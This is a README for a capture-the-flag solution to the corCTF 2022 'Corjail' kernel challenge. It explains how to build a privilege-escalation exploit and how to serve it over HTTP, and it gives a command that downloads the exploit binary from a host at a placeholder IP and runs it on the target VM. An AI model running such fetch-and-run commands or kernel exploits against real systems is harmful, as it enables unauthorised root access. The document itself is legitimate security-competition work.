# CTF Corjail

CTF [[](https://2022.cor.team/)]

Challenge [[](https://github.com/Crusaders-of-Rust/corCTF-2022-public-challenge-archive/tree/master/pwn/corjail)]

Public release of my solution for the Corjail challenge of corCTF 2022. This repository is best used together with the public release of my kernel debugging setup [[](https://github.com/vobst/like-dbg-fork-public)].

## Building

The build is dockerized using a container similar to the one running on the challenge instance.
To build the container execute
```
docker build -t corjail .
```
To build the exploit execute
```
make
```

## Getting Started

You can start an http server to provide the exploit to the challenge VM by executing
```
python -m http.server 7331 --directory $(pwd) &
```
Then, download and run it using
```
cd && curl http://<ip>:7331/build/sploit -o sploit && chmod +x sploit && ./sploit
```

## Pro Tips

- Use the `test_privesc` program in conjunction with the corresponding gdb script in the kernel debugging repository to experiment with different privilege escalation ideas.
- Edit the configuration options in `config.h`. Don not forget to rebuild the exploit and change the options in the `Session` class of the corresponding gdb script.
- Switch between the variants of the exploit that achieve privilege escalation by arbitrary kernel read write and ROP, respectively. Do this by setting or unsetting the `RW_VARIANT` configuration option.
